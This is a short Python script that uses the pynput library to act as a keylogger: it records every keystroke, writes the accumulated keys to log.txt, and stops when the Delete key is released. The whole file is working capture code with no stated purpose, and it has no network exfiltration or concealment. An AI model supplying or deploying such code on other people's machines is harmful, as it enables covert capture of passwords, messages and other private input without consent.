import pynput
from pynput.keyboard import Key, Listener


# Data
keys = []


# Append
def on_press(key):
	keys.append(key)
	write_file(keys)

# Write
def write_file(keys):
	with open('log.txt', 'w') as f:
		for key in keys:
			#removing ''
			k = str(key).replace("'", "") 
			f.write(k)
			#explicitly adding a space after every keystroke for readability
			f.write(' ') 

# Release
def on_release(key):
	if key == Key.delete:
		return False

# Listener Joins
with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()
    